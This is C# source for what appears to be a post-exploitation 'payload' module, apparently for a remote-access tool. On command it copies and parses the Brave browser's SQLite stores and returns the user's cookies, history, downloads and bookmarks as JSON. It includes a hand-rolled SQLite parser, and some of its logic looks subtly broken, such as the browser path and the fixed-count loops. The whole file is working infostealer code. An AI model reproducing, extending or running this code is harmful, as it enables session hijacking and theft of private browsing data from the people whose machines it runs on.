// payload.cs

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;

public class payload
{
    private string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    private string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    private string BraveDir { get { return Path.Combine(ApplicationData, "BraveSoftware", "Brave-Browser"); } }
    private string UserDataFile { get { return Path.Combine(BraveDir, "User Data"); } }
    private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
    private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
    private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }

    private string BookMarkFile { get { return Path.Combine(DefaultDir, "Bookmarks"); } }
    private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
    private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }

    private class clsCookie
    {
        public string szHost;
        public string szName;
        public string szValue;
    }

    private class clsHistory
    {
        public string szTitle;
        public string szURL;
        public string szLastUsed;
    }

    private class clsDownload
    {
        public string szFileName;
        public string szTargetPath;
        public string szURL;
        public long nLength;
        public string szDate;
    }

    private class clsBookmark
    {
        public string szName;
        public string szURL;
        public string szPath;
        public string szAddDate;
        public string szLastUsed;
    }

    public payload() { }

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
            {
                return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
            }

            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
            {
                return "[-] Missing parameter json";
            }

            string szJson = jsonValue.ToString();

            string szAction = fnGetJsonValue(szJson, "action");
            string szProfile = fnGetJsonValue(szJson, "profile");

            var responseObj = new Dictionary<string, object>();
            responseObj["status"] = "success";
            responseObj["action"] = szAction;

            if (szAction == "history")
            {
                var result = fnDumpHistory();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else if (szAction == "download")
            {
                var result = fnDumpDownload();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else if (szAction == "cookie")
            {
                var result = fnDumpCookie();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else if (szAction == "bookmark")
            {
                var result = fnDumpBookmark();
                responseObj["data"] = result.Cast<object>().ToList();
            }
            else
            {
                return SerializeToJson(responseObj);
            }

            return SerializeToJson(responseObj);
        }
        catch (Exception ex)
        {
            return "[-] " + ex.Message;
        }
    }

    private List<clsHistory> fnDumpHistory(int nCount = 100, string szRegex = "")
    {
        List<clsHistory> ls = new List<clsHistory>();

        string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        File.Copy(HistoryFile, dst, true);

        var handler = new clsSQLiteHandler(dst);
        if (!handler.ReadTable("urls"))
            return ls;

        int nRowCount = handler.GetRowCount();

        for (int i = 0; i < nCount; i++)
        {
            var url = handler.GetValue(i, "url");
            var title = handler.GetValue(i, "title");
            var last_visit_time = handler.GetValue(i, "last_visit_time");

            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(title) &&
                (Regex.IsMatch(url, szRegex) || Regex.IsMatch(title, szRegex))
            )
            {
                ls.Add(new clsHistory
                {
                    szURL = url,
                    szTitle = title,
                    szLastUsed = fnChromeTimeToDateTime(long.Parse(last_visit_time))?.ToString("F"),
                });
            }
        }

        File.Delete(dst);

        return ls;
    }

    private List<clsBookmark> fnDumpBookmark()
    {
        List<clsBookmark> ls = new List<clsBookmark>();

        string szContent = File.ReadAllText(BookMarkFile);
        using (JsonDocument doc = JsonDocument.Parse(szContent))
        {
            var root = doc.RootElement;
            if (!root.TryGetProperty("roots", out var roots))
                return ls;

            foreach (JsonProperty r in roots.EnumerateObject())
            {
                var node = r.Value;
                fnParseNode(node, r.Name, ls);
            }
        }

        return ls;
    }

    private List<clsDownload> fnDumpDownload(int nCount = 100, string szRegex = "")
    {
        List<clsDownload> ls = new List<clsDownload>();

        string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        File.Copy(HistoryFile, dst, true);

        var handler = new clsSQLiteHandler(dst);
        if (!handler.ReadTable("downloads"))
            return ls;

        int nRowCount = handler.GetRowCount();

        for (int i = 0; i < nCount; i++)
        {
            var target_path = handler.GetValue(i, "target_path");
            var total_bytes = handler.GetValue(i, "total_bytes");
            var tab_url = handler.GetValue(i, "tab_url");
            var end_time = handler.GetValue(i, "end_time");

            ls.Add(new clsDownload
            {
                szTargetPath = target_path,
                nLength = long.Parse(total_bytes),
                szURL = tab_url,
                szDate = fnChromeTimeToDateTime(long.Parse(end_time))?.ToString("F"),
            });
        }

        if (File.Exists(dst))
            File.Delete(dst);

        return ls;
    }

    private List<clsCookie> fnDumpCookie()
    {
        List<clsCookie> lsResult = new List<clsCookie>();
        string cookieFile = Path.Combine(DefaultDir, "Network", "Cookies");
        if (!File.Exists(cookieFile))
        {
            cookieFile = Path.Combine(DefaultDir, "Cookies");
        }
        if (!File.Exists(cookieFile)) return lsResult;

        string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        File.Copy(cookieFile, dst, true);

        try
        {
            var handler = new clsSQLiteHandler(dst);
            if (handler.ReadTable("cookies"))
            {
                int nRowCount = handler.GetRowCount();
                for (int i = 0; i < nRowCount; i++)
                {
                    lsResult.Add(new clsCookie
                    {
                        szHost = handler.GetValue(i, "host_key") ?? "",
                        szName = handler.GetValue(i, "name") ?? "",
                        szValue = handler.GetValue(i, "value") ?? ""
                    });
                }
            }
        }
        catch { }

        if (File.Exists(dst))
            File.Delete(dst);

        return lsResult;
    }

    private void fnParseNode(JsonElement node, string szCurrentPath, List<clsBookmark> output)
    {
        string type = null;
        if (node.TryGetProperty("type", out var typeProp))
        {
            type = typeProp.GetString();
        }

        if (type == "url")
        {
            string name = node.TryGetProperty("name", out var nameProp) ? nameProp.GetString() : null;
            string url = node.TryGetProperty("url", out var urlProp) ? urlProp.GetString() : null;

            string szAddDate = null;
            if (node.TryGetProperty("date_added", out var dateAddedProp) && long.TryParse(dateAddedProp.GetString() ?? dateAddedProp.GetRawText(), out long dateAdded))
            {
                szAddDate = fnChromeTimeToDateTime(dateAdded)?.ToString("F");
            }

            string szLastUsed = null;
            if (node.TryGetProperty("date_last_used", out var dateLastUsedProp) && long.TryParse(dateLastUsedProp.GetString() ?? dateLastUsedProp.GetRawText(), out long dateLastUsed))
            {
                szLastUsed = fnChromeTimeToDateTime(dateLastUsed)?.ToString("F");
            }

            output.Add(new clsBookmark()
            {
                szName = name,
                szURL = url,
                szPath = szCurrentPath,
                szAddDate = szAddDate,
                szLastUsed = szLastUsed,
            });

            return;
        }

        if (!node.TryGetProperty("children", out var children) || children.ValueKind != JsonValueKind.Array)
            return;

        foreach (var child in children.EnumerateArray())
        {
            string name = child.TryGetProperty("name", out var childNameProp) ? childNameProp.GetString() : null;
            var nextPath = string.IsNullOrEmpty(name) ? szCurrentPath : $"{szCurrentPath}/{name}";

            fnParseNode(child, nextPath, output);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="chromeTime"></param>
    /// <returns></returns>
    private DateTime? fnChromeTimeToDateTime(long chromeTime)
    {
        try
        {
            return DateTime.FromFileTime(10 * chromeTime + 116444736000000000);
        }
        catch
        {
            return null;
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="obj"></param>
    /// <returns></returns>
    private string SerializeToJson(object obj)
    {
        if (obj is Dictionary<string, object> dict)
        {
            var sb = new StringBuilder();
            sb.Append("{");
            bool first = true;

            foreach (var kvp in dict)
            {
                if (!first)
                    sb.Append(",");
                sb.Append($"\"{kvp.Key}\":{SerializeToJson(kvp.Value)}");
                first = false;
            }

            sb.Append("}");

            return sb.ToString();
        }
        else if (obj is List<object> list)
        {
            var sb = new StringBuilder();
            sb.Append("[");
            bool first = true;

            foreach (var item in list)
            {
                if (!first)
                    sb.Append(",");

                sb.Append(SerializeToJson(item));
                first = false;
            }

            sb.Append("]");

            return sb.ToString();
        }
        else if (obj is string str)
        {
            string escaped = str.Replace("\\", "\\\\").Replace("\"", "\\\"");

            return $"\"{escaped}\"";
        }
        else if (obj == null)
        {
            return "null";
        }
        else if (obj is bool b)
        {
            return b ? "true" : "false";
        }
        else if (obj is int || obj is long || obj is double || obj is float || obj is decimal)
        {
            return obj.ToString();
        }
        else
        {
            string escaped = obj.ToString().Replace("\\", "\\\\").Replace("\"", "\\\"");
            return $"\"{escaped}\"";
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="json"></param>
    /// <param name="key"></param>
    /// <returns></returns>
    private string fnGetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success)
            return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success)
            return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }

    public class clsSQLiteHandler
    {
        private byte[] db_bytes;
        private ulong encoding;
        private string[] field_names = new string[1];
        private sqlite_master_entry[] master_table_entries;
        private ushort page_size;
        private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public clsSQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                this.db_bytes = File.ReadAllBytes(baseName);
                if (GetTextEncoding().GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }
                if (this.db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }
                this.page_size = (ushort)this.ConvertToInteger(0x10, 2);
                this.encoding = this.ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(this.encoding), decimal.Zero) == 0)
                {
                    this.encoding = 1L;
                }
                this.ReadMasterTable(100L);
            }
        }

        private Encoding GetTextEncoding()
        {
            switch (encoding)
            {
                case 1:
                    return Encoding.UTF8;
                case 2:
                    return Encoding.Unicode;          //UTF-16 LE
                case 3:
                    return Encoding.BigEndianUnicode; //UTF-16 BE
                default:
                    return Encoding.UTF8;
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if ((Size > 8) | (Size == 0))
            {
                return 0L;
            }
            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = (num2 << 8) | this.db_bytes[startIndex + i];
            }
            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if ((num4 == 0) | (num4 > 9))
            {
                return 0L;
            }
            if (num4 == 1)
            {
                buffer[0] = (byte)(this.db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }
            if (num4 == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = this.db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }
            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if ((i - 1) >= startIndex)
                {
                    buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
                }
            }
            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            if (this.table_entries == null) return 0;
            return this.table_entries.Length;
        }

        public string[] GetTableNames()
        {
            List<string> tableNames = new List<string>();
            int num3 = this.master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (this.master_table_entries[i].item_type == "table")
                {
                    tableNames.Add(this.master_table_entries[i].item_name);
                }
            }
            return tableNames.ToArray();
        }

        public string GetValue(int row_num, int field)
        {
            if (this.table_entries == null || row_num >= this.table_entries.Length)
            {
                return null;
            }
            if (field >= this.table_entries[row_num].content.Length)
            {
                return null;
            }
            return this.table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = this.field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return this.GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > this.db_bytes.Length)
            {
                return 0;
            }
            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > (this.db_bytes.Length - 1))
                {
                    return 0;
                }
                if ((this.db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return (startIndex + 8);
        }

        private bool IsOdd(long value)
        {
            return ((value & 1L) == 1L);
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.master_table_entries != null)
                {
                    length = this.master_table_entries.Length;
                    Array.Resize(ref master_table_entries, this.master_table_entries.Length + num2 + 1);
                }
                else
                {
                    this.master_table_entries = new sqlite_master_entry[num2 + 1];
                }
                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num7 = this.CVL((int)num, endIndex);
                    int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.master_table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num6 = endIndex;
                    long num5 = this.CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = this.GVL(endIndex);
                        numArray[index] = this.CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (this.IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            numArray[index] = this.SQLDataTypeSize[(int)numArray[index]];
                        }
                        index++;
                    }
                    while (index <= 4);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_type = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].item_name = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    this.master_table_entries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                    {
                        this.master_table_entries[length + i].sql_statement = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(startIndex, 4)), decimal.One), new decimal(this.page_size))));
                    }
                    else
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(this.page_size))));
                    }
                }
                this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            if (this.master_table_entries == null) return false;
            int index = -1;
            int length = this.master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (this.master_table_entries[i].item_name != null && this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }
            if (index == -1)
            {
                return false;
            }
            string[] strArray = this.master_table_entries[index].sql_statement.Substring(this.master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = (strArray[j]).TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }
                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }

                Array.Resize(ref field_names, j + 1);
                this.field_names[j] = strArray[j];
            }
            return this.ReadTableFromOffset((ulong)((this.master_table_entries[index].root_num - 1L) * this.page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.table_entries != null)
                {
                    length = this.table_entries.Length;
                    Array.Resize(ref this.table_entries, this.table_entries.Length + num2 + 1);
                }
                else
                {
                    this.table_entries = new table_entry[num2 + 1];
                }
                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    record_header_field[] _fieldArray = new record_header_field[1];
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num9 = this.CVL((int)num, endIndex);
                    int num8 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num8 = endIndex;
                    long num7 = this.CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        Array.Resize(ref _fieldArray, j + 1);
                        endIndex = num8 + 1;
                        num8 = this.GVL(endIndex);
                        _fieldArray[j].type = this.CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (this.IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 13L)) / 2.0));
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = this.SQLDataTypeSize[(int)_fieldArray[j].type];
                        }
                        num10 = (num10 + (num8 - endIndex)) + 1L;
                    }
                    this.table_entries[length + i].content = new string[(_fieldArray.Length - 1) + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!this.IsOdd(_fieldArray[k].type))
                            {
                                this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                            else
                            {
                                this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            this.table_entries[length + i].content[k] = Convert.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
                        }
                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(this.page_size))));
                }
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}